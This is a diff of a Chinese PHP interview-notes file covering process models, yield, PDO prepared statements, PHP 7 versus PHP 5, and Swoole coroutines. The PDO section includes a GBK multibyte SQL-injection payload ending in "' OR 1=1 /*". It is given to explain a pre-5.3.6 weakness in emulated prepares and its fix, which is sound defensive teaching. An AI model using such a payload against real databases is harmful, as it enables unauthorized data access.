@@ -22077,8 +21710,6 @@ PHP进程模型、进程通讯方式、进程线程的区别分别是：
 3、可以分配给处理器并由处理器执行的一个实体。
 
 4、由单一的顺序的执行线程、一个当前状态和一组相关的系统资源所描述的活动单元。
-
-相关学习推荐：PHP编程从入门到精通
 
 二、进程与线程区别
 
@@ -22119,14 +21750,11 @@ PHP进程模型、进程通讯方式、进程线程的区别分别是：
 信号量（semaphore）：主要作为进程间以及同一进程不同线程之间的同步手段。
 
 5、套接口（Socket）：更为一般的进程间通信机制，可用于不同机器之间的进程间通信。起初是由Unix系统的BSD分支开发出来的，但现在一般可以移植到其它类Unix系统上：Linux和System V的变种都支持套接字。
-```
 
 ### yield 核心原理是什么
-```
 https://www.php.cn/faq/453725.html
+
 yield核心原理是在迭代器块中用于向枚举数对象提供值或发出迭代结束信号，其语句只能出现在iterator块中，该块可用作方法、运算符或访问器的体。
-
-
 
 yield核心原理是：
 
@@ -22154,60 +21782,59 @@ yield 语句不能出现在匿名方法中。
 
 注意 Power 方法的返回类型是 IEnumerable（一种迭代器接口类型）。
 
-```
-
 ### PDO prepare 原理
-```
 https://www.cnblogs.com/DataArt/p/10240829.html
-Prepare的好处 
-    Prepare SQL产生的原因。首先从mysql服务器执行sql的过程开始讲起，SQL执行过程包括以下阶段 词法分析->语法分析->语义分析->执行计划优化->执行。词法分析->语法分析这两个阶段我们称之为硬解析。词法分析识别sql中每个词，语法分析解析SQL语句是否符合sql语法，并得到一棵语法树（Lex）。对于只是参数不同，其他均相同的sql，它们执行时间不同但硬解析的时间是相同的。而同一SQL随着查询数据的变化，多次查询执行时间可能不同，但硬解析的时间是不变的。对于sql执行时间较短，sql硬解析的时间占总执行时间的比率越高。而对于淘宝应用的绝大多数事务型SQL，查询都会走索引，执行时间都比较短。因此淘宝应用db sql硬解析占的比重较大。 
 
-    Prepare的出现就是为了优化硬解析的问题。Prepare在服务器端的执行过程如下
+Prepare的好处 
+
+Prepare SQL产生的原因。首先从mysql服务器执行sql的过程开始讲起，SQL执行过程包括以下阶段 词法分析->语法分析->语义分析->执行计划优化->执行。词法分析->语法分析这两个阶段我们称之为硬解析。词法分析识别sql中每个词，语法分析解析SQL语句是否符合sql语法，并得到一棵语法树（Lex）。对于只是参数不同，其他均相同的sql，它们执行时间不同但硬解析的时间是相同的。而同一SQL随着查询数据的变化，多次查询执行时间可能不同，但硬解析的时间是不变的。对于sql执行时间较短，sql硬解析的时间占总执行时间的比率越高。而对于淘宝应用的绝大多数事务型SQL，查询都会走索引，执行时间都比较短。因此淘宝应用db sql硬解析占的比重较大。 
+
+Prepare的出现就是为了优化硬解析的问题。Prepare在服务器端的执行过程如下
 
  1）  Prepare 接收客户端带”?”的sql, 硬解析得到语法树(stmt->Lex), 缓存在线程所在的preparestatement cache中。此cache是一个HASH MAP. Key为stmt->id. 然后返回客户端stmt->id等信息。
 
  2）  Execute 接收客户端stmt->id和参数等信息。注意这里客户端不需要再发sql过来。服务器根据stmt->id在preparestatement cache中查找得到硬解析后的stmt, 并设置参数，就可以继续后面的优化和执行了。
 
-    Prepare在execute阶段可以节省硬解析的时间。如果sql只执行一次，且以prepare的方式执行，那么sql执行需两次与服务器交互（Prepare和execute）, 而以普通（非prepare）方式，只需要一次交互。这样使用prepare带来额外的网络开销，可能得不偿失。我们再来看同一sql执行多次的情况，比如以prepare方式执行10次，那么只需要一次硬解析。这时候  额外的网络开销就显得微乎其微了。因此prepare适用于频繁执行的SQL。
+Prepare在execute阶段可以节省硬解析的时间。如果sql只执行一次，且以prepare的方式执行，那么sql执行需两次与服务器交互（Prepare和execute）, 而以普通（非prepare）方式，只需要一次交互。这样使用prepare带来额外的网络开销，可能得不偿失。我们再来看同一sql执行多次的情况，比如以prepare方式执行10次，那么只需要一次硬解析。这时候  额外的网络开销就显得微乎其微了。因此prepare适用于频繁执行的SQL。
 
-    Prepare的另一个作用是防止sql注入，不过这个是在客户端jdbc通过转义实现的，跟服务器没有关系。 
+Prepare的另一个作用是防止sql注入，不过这个是在客户端jdbc通过转义实现的，跟服务器没有关系。 
 
 硬解析的比重
-   压测时通过perf 得到的结果，硬解析相关的函数比重都比较靠前（MYSQLparse 4.93%, lex_one_token 1.79%, lex_start 1.12%）总共接近8%。因此，服务器使用prepare是可以带来较多的性能提升的。
+
+压测时通过perf 得到的结果，硬解析相关的函数比重都比较靠前（MYSQLparse 4.93%, lex_one_token 1.79%, lex_start 1.12%）总共接近8%。因此，服务器使用prepare是可以带来较多的性能提升的。
 
 jdbc与prepare 
-  jdbc服务器端的参数：
 
-   useServerPrepStmts：默认为false. 是否使用服务器prepare开关
+jdbc服务器端的参数：
 
-  jdbc客户端参数：
+useServerPrepStmts：默认为false. 是否使用服务器prepare开关
 
-   cachePrepStmts：默认false.是否缓存prepareStatement对象。每个连接都有一个缓存，是以sql为唯一标识的LRU cache. 同一连接下，不同stmt可以不用重新创建prepareStatement对象。
+jdbc客户端参数：
 
-   prepStmtCacheSize：LRU cache中prepareStatement对象的个数。一般设置为最常用sql的个数。
+cachePrepStmts：默认false.是否缓存prepareStatement对象。每个连接都有一个缓存，是以sql为唯一标识的LRU cache. 同一连接下，不同stmt可以不用重新创建prepareStatement对象。
 
-   prepStmtCacheSqlLimit：prepareStatement对象的大小。超出大小不缓存。
+prepStmtCacheSize：LRU cache中prepareStatement对象的个数。一般设置为最常用sql的个数。
 
-  Jdbc对prepare的处理过程： 
+prepStmtCacheSqlLimit：prepareStatement对象的大小。超出大小不缓存。
 
-  useServerPrepStmts=true时Jdbc对prepare的处理
+Jdbc对prepare的处理过程： 
 
-   1）  创建PreparedStatement对象，向服务器发送COM_PREPARE命令，并传送带问号的sql. 服务器返回jdbc stmt->id等信息
+useServerPrepStmts=true时Jdbc对prepare的处理
 
-   2）  向服务器发送COM_EXECUTE命令,并传送参数信息。
+1）  创建PreparedStatement对象，向服务器发送COM_PREPARE命令，并传送带问号的sql. 服务器返回jdbc stmt->id等信息
 
-  useServerPrepStmts=false时Jdbc对prepare的处理
+2）  向服务器发送COM_EXECUTE命令,并传送参数信息。
 
-   1）  创建PreparedStatement对象，此时不会和服务器交互。
+useServerPrepStmts=false时Jdbc对prepare的处理
 
-   2） 根据参数和PreparedStatement对象拼接完整的SQL，向服务器发送QUERY命令
+1）  创建PreparedStatement对象，此时不会和服务器交互。
 
-   我们再看参数cachePrepStmts打开时在useServerPrepStmts为true或false时，均缓存PreparedStatement对象。只不过useServerPrepStmts为的true缓存PreparedStatement对象包含服务器的stmt->id等信息，也就是说如果重用了PreparedStatement对象，那么就省去了和服务器通讯（COM_PREPARE命令）的开销。而useServerPrepStmts=false是，开启cachePrepStmts缓存PreparedStatement对象只是简单的sql解析信息，因此此时开启cachePrepStmts意义不是太大。
+2） 根据参数和PreparedStatement对象拼接完整的SQL，向服务器发送QUERY命令
+
+我们再看参数cachePrepStmts打开时在useServerPrepStmts为true或false时，均缓存PreparedStatement对象。只不过useServerPrepStmts为的true缓存PreparedStatement对象包含服务器的stmt->id等信息，也就是说如果重用了PreparedStatement对象，那么就省去了和服务器通讯（COM_PREPARE命令）的开销。而useServerPrepStmts=false是，开启cachePrepStmts缓存PreparedStatement对象只是简单的sql解析信息，因此此时开启cachePrepStmts意义不是太大。
 
 我们来开看一段java代码         
-
-复制代码
- 
+```
             Connection con = null;
             PreparedStatement ps = null;
             String sql = "select * from user where id=?";
@@ -22219,27 +21846,23 @@ jdbc与prepare
             ps.setInt(1, 3);            
             ps.executeQuery();            
             ps.close();
- 
-复制代码
-    这段代码在同一会话中两次prepare执行同一语句，并且之间有ps.close();
+``` 
+这段代码在同一会话中两次prepare执行同一语句，并且之间有ps.close();
 
-    useServerPrepStmts=false时，服务器会两次硬解析同一SQL。
+useServerPrepStmts=false时，服务器会两次硬解析同一SQL。
 
-    useServerPrepStmts=true, cachePrepStmts=false时服务器仍然会两次硬解析同一SQL。
+useServerPrepStmts=true, cachePrepStmts=false时服务器仍然会两次硬解析同一SQL。
 
-    useServerPrepStmts=true, cachePrepStmts=true时服务器只会硬解析一次SQL。
+useServerPrepStmts=true, cachePrepStmts=true时服务器只会硬解析一次SQL。
 
- 
+如果两次prepare之间没有ps.close();那么cachePrepStmts=true，cachePrepStmts=false也只需一次硬解析. 
 
-    如果两次prepare之间没有ps.close();那么cachePrepStmts=true，cachePrepStmts=false也只需一次硬解析. 
-
-    因此，客户端对同一sql,频繁分配和释放PreparedStatement对象的情况下，开启cachePrepStmts参数是很有必要的。
+因此，客户端对同一sql,频繁分配和释放PreparedStatement对象的情况下，开启cachePrepStmts参数是很有必要的。
 
 测试
-   1)做了一个简单的测试，主要测试prepare的效果和useServerPrepStmts参数的影响.       
 
-复制代码
- 
+1)做了一个简单的测试，主要测试prepare的效果和useServerPrepStmts参数的影响.       
+```
         cnt = 5000;
         // no prepare
         String sql = "select biz_order_id,out_order_id,seller_nick,buyer_nick,seller_id,buyer_id,auction_id,auction_title,auction_price,buy_amount,biz_type,sub_biz_type,fail_reason,pay_status,logistics_status,out_trade_status,snap_path,gmt_create,status,ifnull(buyer_rate_status, 4) buyer_rate_status from tc_biz_order_0030 where " +
@@ -22282,33 +21905,24 @@ jdbc与prepare
         temp = end.getTime() - begin.getTime();
         System.out.println("prepare interval:" + temp);
  
-复制代码
 经多次采样测试结果如下
- 	非prepare和prepare时间比
+非prepare和prepare时间比
 useServerPrepStmts=true	0.93
 useServerPrepStmts=false	1.01
- 
+``` 
 
 结论：
-
 useServerPrepStmts=true时，prepare提升7%；
-
 useServerPrepStmts=false时，prepare与非prepare性能相当。 
-
  
-
 如果将语句简化为select * from tc_biz_order_0030 where parent_id =?。那么测试的结论useServerPrepStmts=true时，prepare仅提升2%；sql越简单硬解析的时间就越少，prepare的提升就越少。
-
- 
 
 注意：这个测试是在单个连接，单条sql的理想情况下进行的，线上会出现多连接多sql,还有sql执行频率，sql的复杂程度等不同，因此prepare的提升效果会随具体环境而变化。 
 
 2）prepare 前后的perf top 对比 
 
-   以下为非prepare    
-
-复制代码
- 
+以下为非prepare    
+```
      6.46%   mysqld  mysqld              [.] _Z10MYSQLparsePv
      3.74%   mysqld  libc-2.12.so        [.] __memcpy_ssse3
      2.50%   mysqld  mysqld              [.] my_hash_sort_utf8
@@ -22326,14 +21940,10 @@ useServerPrepStmts=false时，prepare与非prepare性能相当。
      0.91%   mysqld  mysqld              [.] _ZL15get_hash_symbolPKcjb
      0.88%   mysqld  mysqld              [.] row_search_for_mysql
      0.86%   mysqld  [kernel.kallsyms]   [k] tcp_recvmsg    
- 
-复制代码
- 
+``` 
 
- 以下为perpare    
-
-复制代码
- 
+以下为perpare    
+```
      3.46%   mysqld  libc-2.12.so        [.] __memcpy_ssse3
      2.32%   mysqld  mysqld              [.] cmp_dtuple_rec_with_match
      2.14%   mysqld  mysqld              [.] _ZL14build_templateP19row_prebuilt_structP3THDP5TABLEj
@@ -22359,12 +21969,11 @@ useServerPrepStmts=false时，prepare与非prepare性能相当。
      0.60%   mysqld  mysqld              [.] _Z19find_field_in_tableP3THDP5TABLEPKcjbPj
      0.60%   mysqld  mysqld              [.] page_check_dir
      0.57%   mysqld  mysqld              [.] _Z16dispatch_command19enum_server_commandP3THDP
- 
-复制代码
-    对比可以发现 MYSQLparse lex_one_token在prepare时已优化掉了。
+``` 
+对比可以发现 MYSQLparse lex_one_token在prepare时已优化掉了。
 
 思考
-   1 开启cachePrepStmts的问题，前面谈到每个连接都有一个缓存，是以sql为唯一标识的LRU cache. 在分表较多，大连接的情况下，可能会个应用服务器带来内存问题。这里有个前提是ibatis是默认使用prepare的。 在mybatis中，标签statementType可以指定某个sql是否是使用prepare.
+1 开启cachePrepStmts的问题，前面谈到每个连接都有一个缓存，是以sql为唯一标识的LRU cache. 在分表较多，大连接的情况下，可能会个应用服务器带来内存问题。这里有个前提是ibatis是默认使用prepare的。 在mybatis中，标签statementType可以指定某个sql是否是使用prepare.
 
 statementType Any one of STATEMENT, PREPARED or CALLABLE. This causes MyBatis to use Statement, PreparedStatement orCallableStatement respectively. Default: PREPARED.
 
@@ -22372,42 +21981,54 @@ statementType Any one of STATEMENT, PREPARED or CALLABLE. This causes MyBatis to
 
 标签。
 
-    2 服务器端prepare cache是一个HASH MAP. Key为stmt->id,同时也是每个连接都维护一个。因此也有可能出现内存问题，待实际测试。如有必要需改造成Key为sql的全局cache，这样不同连接的相同prepare sql可以共享。 
+2 服务器端prepare cache是一个HASH MAP. Key为stmt->id,同时也是每个连接都维护一个。因此也有可能出现内存问题，待实际测试。如有必要需改造成Key为sql的全局cache，这样不同连接的相同prepare sql可以共享。 
 
-    3 oracle prepare与mysql prepare的区别：
+3 oracle prepare与mysql prepare的区别：
 
-      mysql与oracle有一个重大区别是mysql没有oracle那样的执行计划缓存。前面我们讲到SQL执行过程包括以下阶段 词法分析->语法分析->语义分析->执行计划优化->执行。oracle的prepare实际上包括以下阶段：词法分析->语法分析->语义分析->执行计划优化，也就是说oracle的prepare做了更多的事情，execute只需要执行即可。因此，oracle的prepare比mysql更高效。
+mysql与oracle有一个重大区别是mysql没有oracle那样的执行计划缓存。前面我们讲到SQL执行过程包括以下阶段 词法分析->语法分析->语义分析->执行计划优化->执行。oracle的prepare实际上包括以下阶段：词法分析->语法分析->语义分析->执行计划优化，也就是说oracle的prepare做了更多的事情，execute只需要执行即可。因此，oracle的prepare比mysql更高效。
+
 https://www.jb51.net/article/56612.htm
+
 我们都知道，只要合理正确使用PDO,可以基本上防止SQL注入的产生，本文主要回答以下两个问题：
+
 为什么要使用PDO而不是mysql_connect？
+
 为何PDO能防注入？
+
 使用PDO防注入的时候应该特别注意什么?
- 
+
 一、为何要优先使用PDO?
 
 PHP手册上说得很清楚：
+
 Prepared statements and stored procedures
+
 Many of the more mature databases support the concept of prepared statements. What are they? They can be thought of as a kind of compiled template for the SQL that an application wants to run, that can be customized using variable parameters. Prepared statements offer two major benefits:
 
 The query only needs to be parsed (or prepared) once, but can be executed multiple times with the same or different parameters. When the query is prepared, the database will analyze, compile and optimize its plan for executing the query. For complex queries this process can take up enough time that it will noticeably slow down an application if there is a need to repeat the same query many times with different parameters. By using a prepared statement the application avoids repeating the analyze/compile/optimize cycle. This means that prepared statements use fewer resources and thus run faster.
- 
 
 The parameters to prepared statements don't need to be quoted; the driver automatically handles this. If an application exclusively uses prepared statements, the developer can be sure that no SQL injection will occur (however, if other portions of the query are being built up with unescaped input, SQL injection is still possible).
- 
+
 即使用PDO的prepare方式，主要是提高相同SQL模板查询性能、阻止SQL注入
+
 同时，PHP手册中给出了警告信息
+
 Prior to PHP 5.3.6, this element was silently ignored. The same behaviour can be partly replicated with the PDO::MYSQL_ATTR_INIT_COMMAND driver option, as the following example shows.
+
 Warning
+
 The method in the below example can only be used with character sets that share the same lower 7 bit representation as ASCII, such as ISO-8859-1 and UTF-8. Users using character sets that have different representations (such as UTF-16 or Big5) must use the charset option provided in PHP 5.3.6 and later versions.
- 
+
 意思是说，在PHP 5.3.6及以前版本中，并不支持在DSN中的charset定义，而应该使用PDO::MYSQL_ATTR_INIT_COMMAND设置初始SQL, 即我们常用的 set names gbk指令。
- 
+
 我看到一些程序，还在尝试使用addslashes达到防注入的目的，殊不知这样其实问题更多, 详情请看https://www.jb51.net/article/49205.htm
 还有一些做法：在执行数据库查询前，将SQL中的select, union, ....之类的关键词清理掉。这种做法显然是非常错误的处理方式，如果提交的正文中确实包含 the students's union , 替换后将篡改本来的内容，滥杀无辜，不可取。
- 
+
 二、为何PDO能防SQL注入？
+
 请先看以下PHP代码：
 复制代码代码如下:
+```
 <?php
 $pdo = new PDO("mysql:host=192.168.0.1;dbname=test;charset=utf8","root");
 $st = $pdo->prepare("select * from info where id =? and name = ?");
@@ -22420,34 +22041,35 @@ $st->bindParam(2,$name);
 $st->execute();
 $st->fetchAll();
 ?>
-
+```
  
 环境如下：
+
 PHP 5.4.7
+
 Mysql 协议版本 10
+
 MySQL Server 5.5.27
  
 为了彻底搞清楚php与mysql server通讯的细节，我特别使用了wireshark抓包进行研究之,安装wireshak之后，我们设置过滤条件为tcp.port==3306, 如下图：
  
- 
- 
 如此只显示与mysql 3306端口的通信数据，避免不必要的干扰。
+
 特别要注意的是wireshak基于wincap驱动，不支持本地环回接口的侦听（即使用php连接本地mysql的方法是无法侦听的），请连接其它机器（桥接网络的虚拟机也可）的MySQL进行测试。
  
 然后运行我们的PHP程序，侦听结果如下，我们发现，PHP只是简单地将SQL直接发送给MySQL Server :
- 
- 
  
 其实，这与我们平时使用mysql_real_escape_string将字符串进行转义，再拼接成SQL语句没有差别（只是由PDO本地驱动完成转义的），显然这种情况下还是有可能造成SQL注入的，也就是说在php本地调用pdo prepare中的mysql_real_escape_string来操作query，使用的是本地单字节字符集，而我们传递多字节编码的变量时，有可能还是会造成SQL注入漏洞(php 5.3.6以前版本的问题之一，这也就解释了为何在使用PDO时，建议升级到php 5.3.6+，并在DSN字符串中指定charset的原因。
  
 针对php 5.3.6以前版本，以下代码仍然可能造成SQL注入问题：
 复制代码代码如下:
+```
 $pdo->query('SET NAMES GBK');
 $var = chr(0xbf) . chr(0x27) . " OR 1=1 /*";
 $query = "SELECT * FROM info WHERE name = ?";
 $stmt = $pdo->prepare($query);
 $stmt->execute(array($var));
-
+```
  
 原因与上面的分析是一致的。
  
@@ -22456,6 +22078,7 @@ $stmt->execute(array($var));
 那么，如何才能禁止PHP本地转义而交由MySQL Server转义呢？
 PDO有一项参数，名为PDO::ATTR_EMULATE_PREPARES ，表示是否使用PHP本地模拟prepare，此项参数默认值未知。而且根据我们刚刚抓包分析结果来看，php 5.3.6+默认还是使用本地变量转，拼接成SQL发送给MySQL Server的，我们将这项值设置为false, 试试效果，如以下代码：
 复制代码代码如下:
+```
 <?php
 $pdo = new PDO("mysql:host=192.168.0.1;dbname=test;","root");
 $pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);//这是我们刚加入的内容
@@ -22469,21 +22092,20 @@ $st->bindParam(2,$name);
 $st->execute();
 $st->fetchAll();
 ?>
-
+```
  
 运行一下程序，使用wireshark抓包分析，得出的结果如下：
 
-
-
-
 看到了吗？这就是神奇之处，可见这次PHP是将SQL模板和变量是分两次发送给MySQL的，由MySQL完成变量的转义处理，既然变量和SQL模板是分两次发送的，那么就不存在SQL注入的问题了，但需要在DSN中指定charset属性，如：
 复制代码代码如下:
+```
 $pdo = new PDO('mysql:host=localhost;dbname=test;charset=utf8', 'root');
-
+```
  
 如此，即可从根本上杜绝SQL注入的问题。如果你对此不是很清楚，可以发邮件至zhangxugg@163.com, 一起探讨。
  
 三、使用PDO的注意事项
+
 知道以上几点之后，我们就可以总结使用PDO杜绝SQL注入的几个注意事项：
 
 1.  php升级到5.3.6+，生产环境强烈建议升级到php 5.3.9+ php 5.4+，php 5.3.8存在致命的hash碰撞漏洞。
@@ -22499,6 +22121,7 @@ $pdo = new PDO('mysql:host=localhost;dbname=test;charset=utf8', 'root');
 是的，不能省。set names <charset>其实有两个作用：
 
 A.  告诉mysql server, 客户端（PHP程序）提交给它的编码是什么
+
 B.  告诉mysql server, 客户端需要的结果的编码是什么
 
 也就是说，如果数据表使用gbk字符集，而PHP程序使用UTF-8编码，我们在执行查询前运行set names utf8, 告诉mysql server正确编码即可，无须在程序中编码转换。这样我们以utf-8编码提交查询到mysql server, 得到的结果也会是utf-8编码。省却了程序中的转换编码问题，不要有疑问，这样做不会产生乱码。
@@ -22506,14 +22129,11 @@ B.  告诉mysql server, 客户端需要的结果的编码是什么
 那么在DSN中指定charset的作用是什么? 只是告诉PDO, 本地驱动转义时使用指定的字符集（并不是设定mysql server通信字符集），设置mysql server通信字符集，还得使用set names <charset>指令。
  
 我真想不通，一些新的项目，为何不使用PDO而使用传统的mysql_XXX函数库呢？如果正确使用PDO，可以从根本上杜绝SQL注入，我强烈建议各个公司的技术负责人、一线技术研发人员，要对这个问题引起重视，尽可能使用PDO加快项目进度和安全质量。
-```
 
 ### PHP 7 与 PHP 5 有什么区别
-```
 https://www.cnblogs.com/FLy-1992/p/11647839.html
-PHP7距正式发布以及有挺长时间了，刚出道就号称比旧版本快了几倍，各种开源框架或系统运行在PHP7上速度效率提高了几倍。那么php7和php5之间的区别是什么？下面本篇文章就来给大家简单介绍一下，希望对你们有所帮助。
 
- 
+PHP7距正式发布以及有挺长时间了，刚出道就号称比旧版本快了几倍，各种开源框架或系统运行在PHP7上速度效率提高了几倍。那么php7和php5之间的区别是什么？下面本篇文章就来给大家简单介绍一下，希望对你们有所帮助。
 
 php7和php5区别之间的区别：
 
@@ -22542,116 +22162,37 @@ php7和php5区别之间的区别：
 2、改善数组结构，数组元素和hash映射表被分配在同一块内存里，降低了内存占用、提升了 cpu 缓存命中率
 
 3、改进了函数的调用机制，通过优化参数传递的环节，减少了一些指令，提高执行效率
+
 https://www.jb51.net/article/171609.htm
-php5与php7的区别是什么？下面本篇文章就来给大家对比一下php5与php7，介绍php5与php7之间的区别。有一定的参考价值，有需要的朋友可以参考一下，希望对你有所帮助。
-
-php5与php7之间的区别：
-
-1、性能提升：PHP7比PHP5.0性能提升了两倍。
-
-2、以前的许多致命错误，现在改成抛出异常。
-
-3、PHP 7.0比PHP5.0移除了一些老的不在支持的SAPI（服务器端应用编程端口）和扩展。
-
-4、PHP 7.0比PHP5.0新增了空接合操作符。
-
-5、PHP 7.0比PHP5.0新增加了结合比较运算符。
-
-6、PHP 7.0比PHP5.0新增加了函数的返回类型声明。
-
-7、PHP 7.0比PHP5.0新增加了标量类型声明。
-
-8、PHP 7.0比PHP5.0新增加匿名类。
-
-9、错误处理和64位支持
-
-如果您了解错误和异常之间的区别，那么您就会知道在PHP 5中处理致命错误非常不容易。PHP7简化了流程，因为它已用可以轻松处理的异常替换了几个主要错误。这是通过引入新的引擎异常对象实现的。
-
-您可能已经知道，PHP 5不支持64位整数或大文件，但PHP 7中的情况已发生变化。PHP7具有64位支持，因此您也可以使用本机64位整数作为大文件，因此，您可以在64位系统体系结构上完美运行应用程序。
-
-10、声明返回类型
-
-在PHP 5中，程序员无法定义函数或方法的返回类型。在现实生活中，这是一个巨大的缺点，因为程序员无法防止意外的返回类型并在其他情况下生成异常。
-
-幸运的是，PHP 7允许程序员根据期望的返回值声明函数的返回类型。这肯定会使代码健壮和准确。有四种不同的返回类型可用-bool，int，string和float。
-
-为什么 PHP7 比 PHP5 性能提升了？
-
-1、变量存储字节减小，减少内存占用，提升变量操作速度
-
-2、改善数组结构，数组元素和hash映射表被分配在同一块内存里，降低了内存占用、提升了 cpu 缓存命中率
-
-3、改进了函数的调用机制，通过优化参数传递的环节，减少了一些指令，提高执行效率
-
-以上就是php5与php7的区别是什么？的详细内容，更多请关注脚本之家其它相关文章！
-https://zhuanlan.zhihu.com/p/96785667
-php5与php7之间的区别：
-1、性能提升：PHP7比PHP5.0性能提升了两倍。
-
-2、以前的许多致命错误，现在改成抛出异常。
-
-3、PHP 7.0比PHP5.0移除了一些老的不在支持的SAPI（服务器端应用编程端口）和扩展。
-
-4、PHP 7.0比PHP5.0新增了空接合操作符。
-
-5、PHP 7.0比PHP5.0新增加了结合比较运算符。
-
-6、PHP 7.0比PHP5.0新增加了函数的返回类型声明。
-
-7、PHP 7.0比PHP5.0新增加了标量类型声明。
-
-8、PHP 7.0比PHP5.0新增加匿名类。
-
-9、错误处理和64位支持
-
-如果您了解错误和异常之间的区别，那么您就会知道在PHP 5中处理致命错误非常不容易。PHP7简化了流程，因为它已用可以轻松处理的异常替换了几个主要错误。这是通过引入新的引擎异常对象实现的。
-
-您可能已经知道，PHP 5不支持64位整数或大文件，但PHP 7中的情况已发生变化。PHP7具有64位支持，因此您也可以使用本机64位整数作为大文件，因此，您可以在64位系统体系结构上完美运行应用程序。
-
-10、声明返回类型
-
-在PHP 5中，程序员无法定义函数或方法的返回类型。在现实生活中，这是一个巨大的缺点，因为程序员无法防止意外的返回类型并在其他情况下生成异常。
-
-幸运的是，PHP 7允许程序员根据期望的返回值声明函数的返回类型。这肯定会使代码健壮和准确。有四种不同的返回类型可用-bool，int，string和float。
-
-为什么 PHP7 比 PHP5 性能提升了？
-
-1、变量存储字节减小，减少内存占用，提升变量操作速度
-
-2、改善数组结构，数组元素和hash映射表被分配在同一块内存里，降低了内存占用、提升了 cpu 缓存命中率
-
-3、改进了函数的调用机制，通过优化参数传递的环节，减少了一些指令，提高执行效率
-```
 
 ### Swoole 适用场景，协程实现方式
-```
+
 https://blog.csdn.net/assasin0308/article/details/93649725
+
 什么是协程
+
 协程(Coroutine)也叫用户态线程，其通过协作而不是抢占来进行切换。相对于进程或者线程，协程所有的操作都可以在用户态完成，创建和切换的消耗更低。协程是进程的补充，或者是互补关系。
 
-         要理解是什么是“用户态的线程”，必然就要先理解什么是“内核态的线程”。 内核态的线程是由操作系统来进行调度的，在切换线程上下文时，要先保存上一个线程的上下文，然后执行下一个线程，当条件满足时，切换回上一个线程，并恢复上下文。 协程也是如此，只不过，用户态的线程不是由操作系统来调度的，而是由程序员来调度的，就是所谓的用户态的线程。
-
-
+要理解是什么是“用户态的线程”，必然就要先理解什么是“内核态的线程”。 内核态的线程是由操作系统来进行调度的，在切换线程上下文时，要先保存上一个线程的上下文，然后执行下一个线程，当条件满足时，切换回上一个线程，并恢复上下文。 协程也是如此，只不过，用户态的线程不是由操作系统来调度的，而是由程序员来调度的，就是所谓的用户态的线程。
 
 协程的适用场景
+
 高并发服务，如秒杀系统、高性能API接口、RPC服务器，使用协程模式，服务的容错率会大大增加，某些接口出现故障时，不会导致整个服务崩溃。
 
-      爬虫，可实现非常巨大的并发能力，即使是非常慢速的网络环境，也可以高效地利用带宽。
+爬虫，可实现非常巨大的并发能力，即使是非常慢速的网络环境，也可以高效地利用带宽。
 
-      即时通信服务，如IM聊天、游戏服务器、物联网、消息服务器等等，可以确保消息通信完全无阻塞，每个消息包均可即时地被处理。
-
- 
+即时通信服务，如IM聊天、游戏服务器、物联网、消息服务器等等，可以确保消息通信完全无阻塞，每个消息包均可即时地被处理。
 
 协程与线程区别
+
 Swoole的协程在底层实现上是单线程的，因此同一时间只有一个协程在工作，协程的执行是串行的。这与线程不同，多个线程会被操作系统调度到多个CPU并行执行。
 
 一个协程正在运行时，其他协程会停止工作。当前协程执行阻塞IO操作时会挂起，底层调度器会进入事件循环。当有IO完成事件时，底层调度器恢复事件对应的协程的执行。
 
 对CPU多核的利用，仍然依赖于Swoole引擎的多进程机制。
 
- 
-
 协程实现
+
 1、swoole的两种命名空间形式
 
 Swoole支持两种形式的命名空间一种是Swoole\Coroutine，2.2.0以上可使用Co\命名空间短命名简化类名。
@@ -22659,8 +22200,6 @@ Swoole支持两种形式的命名空间一种是Swoole\Coroutine，2.2.0以上�
 2、协程默认支持的位置
 
 目前Swoole4仅有部分事件回调函数底层自动创建了协程，以下回调函数可以调用协程客户端，可以查看这里https://wiki.swoole.com/wiki/page/696.html
-
- 
 
 在不支持协程的位置可以使用go或Co::create创建协程
 
@@ -22676,7 +22215,7 @@ Swoole支持两种形式的命名空间一种是Swoole\Coroutine，2.2.0以上�
 
 5、协程通讯
 
-  使用本地内存，不同的进程之间内存是隔离的。只能在同一进程的不同协程内进行push和pop操作
+使用本地内存，不同的进程之间内存是隔离的。只能在同一进程的不同协程内进行push和pop操作
 
 向通道中写入数据。
 
@@ -22692,11 +22231,10 @@ function Coroutine\Channel->pop() : mixed;
 
 如果在多个协程间共用同一个协程客户端,同步阻塞程序不同，协程是并发处理请求的，因此同一时间可能会有很多个请求在并行处理，一旦共用客户端连接，就会导致不同协程之间发生数据错乱。
 
- 
-
 swoole通用协程池的实现
-swoole官方的协程池是用只能用在Redis。因为协程池代码层耦合了Redis实例化逻辑。通过工厂函数实现了通用性。
 
+swoole官方的协程池是用只能用在Redis。因为协程池代码层耦合了Redis实例化逻辑。通过工厂函数实现了通用性。
+```
 class RedisPool
 {
     /**
@@ -22736,8 +22274,9 @@ class RedisPool
         return $this->pool->pop();
     }
 }
+```
 利用工厂方法的改造如下：
-
+```
 <?php
 /**
  * @author xialeistudio
@@ -22831,10 +22370,13 @@ class GenericPool
         $this->channel->push($resource);
     }
 }
+```
 https://segmentfault.com/a/1190000019089997?utm_source=tag-newest
+
 Swoole协程简介
 
-  Swoole4为PHP语言提供了强大的CSP协程编程模式，用户可以通过go函数创建一个协程，以达到并发执行的效果，如下面代码所示：
+Swoole4为PHP语言提供了强大的CSP协程编程模式，用户可以通过go函数创建一个协程，以达到并发执行的效果，如下面代码所示：
+```
 <?php
 
 //Co::sleep()是Swoole提供的API，并不会阻塞当前进程，只会阻塞协程触发协程切换。
@@ -22854,41 +22396,43 @@ echo "c";
 
 //输出结果：cab
 //程序总执行时间2秒
+```
+其实在Swoole4之前就实现了多协程编程模式，在协程创建、切换以及结束的时候，相应的操作php栈即可（创建、切换以及回收php栈）。
 
-  其实在Swoole4之前就实现了多协程编程模式，在协程创建、切换以及结束的时候，相应的操作php栈即可（创建、切换以及回收php栈）。
+此时的协程实现无法完美的支持php语法，其根本原因在于没有保存c栈信息。（vm内部或者某些扩展提供的API是通过c函数实现的，调用这些函数时如果发生协程切换，c栈该如何处理？）
 
-  此时的协程实现无法完美的支持php语法，其根本原因在于没有保存c栈信息。（vm内部或者某些扩展提供的API是通过c函数实现的，调用这些函数时如果发生协程切换，c栈该如何处理？）
+Swoole4新增了c栈的管理，在协程创建、切换以及结束的同时会伴随着c栈的创建、切换以及回收。
 
-  Swoole4新增了c栈的管理，在协程创建、切换以及结束的同时会伴随着c栈的创建、切换以及回收。
+Swoole4协程实现方案如下图所示：
 
-  Swoole4协程实现方案如下图所示：
+其中：
 
-
-image
-
-  其中：
